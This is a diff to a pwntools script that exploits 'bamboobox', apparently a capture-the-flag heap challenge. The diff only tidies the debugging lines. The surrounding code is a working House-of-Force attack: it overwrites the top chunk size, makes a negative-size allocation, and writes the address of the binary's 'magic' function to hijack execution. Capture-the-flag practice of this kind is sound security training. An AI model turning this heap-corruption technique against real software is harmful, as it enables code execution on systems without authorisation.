@@ -11,9 +11,10 @@ context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
 
 io = process("./bamboobox")
 
-def DEBUG():
-	raw_input("DEBUG: ")
-	gdb.attach(io)
+#  def DEBUG():
+	#  raw_input("DEBUG: ")
+	#  gdb.attach(io)
+#  io = gdb.debug("./bamboobox", "b *main\nc")
 
 
 def add(length, name):
@@ -31,8 +32,8 @@ def exit():
     io.sendlineafter(":", "5")
 
 if __name__ == "__main__":
-    add(0x60, cyclic(0x60))
     #  DEBUG()
+    add(0x60, cyclic(0x60))
     change(0, 0x60 + 0x10, cyclic(0x60) + p64(0) + l64(-1))
     add(-(0x60 + 0x10) - (0x10 + 0x10) - 0x10, 'aaaa') # -sizeof(item) - sizeof(box) - 0x10
     add(0x10, p64(ELF("./bamboobox").sym['magic']) * 2)
